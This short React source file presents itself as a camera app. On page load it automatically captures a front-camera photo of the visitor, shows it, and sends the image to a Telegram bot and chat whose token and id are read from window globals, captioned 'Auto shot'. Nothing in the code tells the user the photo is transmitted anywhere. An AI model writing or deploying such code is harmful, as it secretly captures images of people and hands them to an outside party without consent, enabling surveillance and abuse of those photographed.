function CameraApp() {
  const [photoDataUrl, setPhotoDataUrl] = React.useState(null);

  const takeAndSendPhoto = async () => {
    let stream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
      const video = document.createElement("video");
      video.srcObject = stream;
      await new Promise(res => { video.onloadedmetadata = () => { video.play(); res(); }; });

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

      setPhotoDataUrl(canvas.toDataURL("image/png"));

      const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
      if (blob && window.sendPhotoToTelegram) {
        await window.sendPhotoToTelegram({
          botToken: window.TELEGRAM_BOT_TOKEN,
          chatId: window.TELEGRAM_CHAT_ID,
          photoBlob: blob,
          caption: "Auto shot"
        });
      }
    } finally {
      if (stream) stream.getTracks().forEach(t => t.stop());
    }
  };

  React.useEffect(() => {
    takeAndSendPhoto();
  }, []);

  return photoDataUrl && <img src={photoDataUrl} alt="Снимок" style={{ width: "100%" }} />;
}

const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<CameraApp />);
